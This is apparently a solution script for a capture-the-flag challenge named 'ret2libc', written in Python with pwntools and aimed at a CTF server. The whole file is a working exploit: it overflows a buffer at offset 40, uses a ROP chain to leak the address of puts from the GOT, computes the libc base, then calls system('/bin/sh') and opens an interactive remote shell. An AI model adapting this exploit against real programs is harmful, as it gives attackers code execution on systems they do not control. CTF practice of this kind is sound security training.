#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

elf = context.binary = ELF('ret2libc')
#p = elf.process()
p = remote('nc.ctf.unitedctf.ca', 4002)
offset = 40

rop = ROP(elf)
rop.call("puts", [elf.got['puts']])
rop.call("main")

payload = flat({
    offset: rop.chain()
})

p.sendline(payload)
log.info(f"Sending payload {payload}")

p.recvuntil(b"> ")

puts = u64(p.recvline().rstrip().ljust(8, b'\x00'))
log.info(f"Adresse of puts {hex(puts)}")

libc = ELF('libc-2.27.so')
libc.address = puts - libc.sym['puts']
rop.call("puts", [next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.sym['system'], [next(libc.search(b"/bin/sh\x00"))])
rop.call(libc.sym['exit'])

payload = flat({
    offset: rop.chain()
})

p.recvuntil(b"> ")
p.sendline(payload)
log.info(f"Sending another payload {payload}")

print(p.recv())

p.interactive()